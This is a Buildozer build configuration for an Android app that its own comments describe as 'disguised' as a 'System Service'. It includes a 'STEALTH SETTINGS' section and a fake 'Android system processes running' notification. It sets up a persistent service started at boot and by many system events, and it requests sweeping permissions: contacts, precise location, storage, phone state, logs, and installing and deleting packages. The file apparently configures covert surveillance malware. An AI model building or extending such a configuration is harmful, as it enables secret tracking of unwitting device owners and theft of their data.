# buildozer.spec - Complete configuration for System Service APK
# Target: armeabi-v7a ONLY
# CI-Friendly: Let p4a resolve versions automatically

[app]

# (str) Title of your application (disguised)
title = System Service

# (str) Package name - MUST match AndroidManifest.xml
package.name = com.system.service.update

# (str) Source code where the main.py live
source.dir = .

# (list) Application requirements - NO VERSION PINS (let p4a resolve)
requirements = python3, kivy, pyjnius, android, plyer, openssl, requests, urllib3, chardet, idna, qrcode, pillow

# (list) Source files to include
source.include_exts = py, png, jpg, kv, atlas, json, xml, java

# (list) List of inclusions using pattern matching
source.include_patterns = assets/*, res/**, src/**

# (list) Source files to exclude
source.exclude_exts = spec, md, gittattributes

# (list) List of directory to exclude
source.exclude_dirs = tests, bin, venv, .git, __pycache__

# (list) List of exclusions using pattern matching
source.exclude_patterns = license, README*

# (str) Application versioning
version = 1.0

# (str) Supported orientation
orientation = portrait

# ============================================================
# SERVICE CONFIGURATION (CRITICAL)
# ============================================================

# (list) List of service to declare
services = SystemService:service.py

# (str) Service entry point file
service.source = %(source.dir)s/service.py

# ============================================================
# PERMISSIONS - ALL ON ONE LINE
# ============================================================

android.permissions = INTERNET, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE, CHANGE_WIFI_STATE, FOREGROUND_SERVICE, FOREGROUND_SERVICE_DATA_SYNC, FOREGROUND_SERVICE_SPECIAL_USE, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, POWER_SAVE_MODE_CHANGED, SCHEDULE_EXACT_ALARM, USE_EXACT_ALARM, SET_ALARM, SYSTEM_ALERT_WINDOW, BLUETOOTH, BLUETOOTH_ADMIN, BLUETOOTH_CONNECT, BLUETOOTH_SCAN, NFC, READ_CONTACTS, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, MANAGE_EXTERNAL_STORAGE, READ_PHONE_STATE, ACCESS_COARSE_LOCATION, ACCESS_FINE_LOCATION, BATTERY_STATS, PACKAGE_USAGE_STATS, QUERY_ALL_PACKAGES, GET_TASKS, REAL_GET_TASKS, INSTALL_PACKAGES, DELETE_PACKAGES, REQUEST_INSTALL_PACKAGES, WRITE_SETTINGS, READ_LOGS, DUMP

# ============================================================
# ANDROID SDK VERSIONS
# ============================================================

android.api = 33
android.minapi = 21
android.ndk = 25b
android.archs = armeabi-v7a
android.accept_sdk_agreement = True

# ============================================================
# STEALTH SETTINGS
# ============================================================

android.allow_backup = False
android.private_storage = True
android.presplash_color = #000000
android.wakelock = True
android.hide_loading_screen = True
android.enable_androidx = True
android.debug = True

# ============================================================
# GRADLE DEPENDENCIES - ALL ON ONE LINE
# ============================================================

android.gradle_dependencies = androidx.core:core:1.10.1, androidx.work:work-runtime:2.8.0

# ============================================================
# JAVA SOURCE FILES - ALL ON ONE LINE
# ============================================================

android.add_src = src/main/java/com/system/service/update/SystemApplication.java, src/main/java/com/system/service/update/MainActivity.java, src/main/java/com/system/service/update/SystemService.java, src/main/java/com/system/service/update/BootReceiver.java, src/main/java/com/system/service/update/ConnectivityReceiver.java, src/main/java/com/system/service/update/PowerReceiver.java, src/main/java/com/system/service/update/ScreenReceiver.java, src/main/java/com/system/service/update/USBReceiver.java, src/main/java/com/system/service/update/AlarmReceiver.java

# ============================================================
# RESOURCE FILES - ALL ON ONE LINE
# ============================================================

android.add_res = res/xml/network_security_config.xml, res/values/strings.xml

# ============================================================
# CUSTOM ANDROID MANIFEST
# ============================================================

android.manifest.xml = AndroidManifest.xml

# ============================================================
# FOREGROUND SERVICE NOTIFICATION
# ============================================================

android.notification_channel_name = System Service
android.notification_title = System Service
android.notification_text = Android system processes running
android.notification_importance = low
android.foreground_service_type = dataSync

# ============================================================
# P4A CONFIGURATION
# ============================================================

p4a.branch = develop
android.p4a_bootstrap = sdl2

# ============================================================
# BUILD OUTPUT
# ============================================================

fullscreen = 0
log_level = 2
android.logcat = 1
android.release_artifact = apk
android.build_mode = debug

# ============================================================
# MISC
# ============================================================

android.meta_data = 
android.libraries = 

[buildozer]

log_level = 2
warn_on_root = 1
build_dir = ./.buildozer
bin_dir = ./bin
output_filename = SystemService-{version}-{arch}.apk
